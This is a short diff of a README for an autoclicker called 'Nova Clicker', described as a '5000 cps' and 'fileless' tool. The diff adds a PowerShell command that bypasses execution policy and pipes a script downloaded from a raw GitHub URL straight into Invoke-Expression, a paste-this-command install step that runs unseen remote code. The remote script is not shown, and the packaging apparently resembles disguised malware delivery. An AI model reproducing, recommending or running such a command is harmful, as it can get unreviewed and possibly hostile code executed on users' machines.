@@ -1,2 +1,4 @@
-# Nova-Clicker
-5000 cps clicker (fileless)
+# Nova Clicker
+
+```powershell
+powershell -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/imsandydll/Nova-Clicker/main/NovaClicker.ps1')"
